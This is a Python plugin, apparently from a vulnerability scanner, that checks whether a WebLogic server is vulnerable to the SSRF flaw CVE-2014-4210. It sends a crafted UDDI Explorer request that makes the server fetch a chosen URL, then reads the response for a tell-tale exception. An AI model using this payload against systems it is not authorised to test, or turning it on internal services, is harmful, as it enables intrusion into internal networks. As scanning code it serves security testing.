# -*- coding:utf-8 -*-
#@Time : 2020/4/22 14:29
#@Author: Triomphe
#@File : weblogic_ssrf.py

import requests
"""Version: 10.0.2/10.3.6
        CVE-2014-4210"""


def get_plugin_info():
    plugin_info = {
        "name": "Weblogic SSRF",
        "info": "Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。",
        "level": "高危",
        "type": "SSRF",
        "keyword": "tag:weblogic",
        "source": 1,
    }
    return plugin_info

def check(ip,port=7001,timeout=10):
    payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    url ='http://'+ip+':'+str(port)
    post_url=url+payload
    try:
        req = requests.get(post_url, timeout=timeout, verify=False)
        if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
            print("[+] 存在WebLogic ssrf")
            return url+" [+] 存在WebLogic ssrf"
        else:
            return
    except Exception as e:
        print(e)
        return
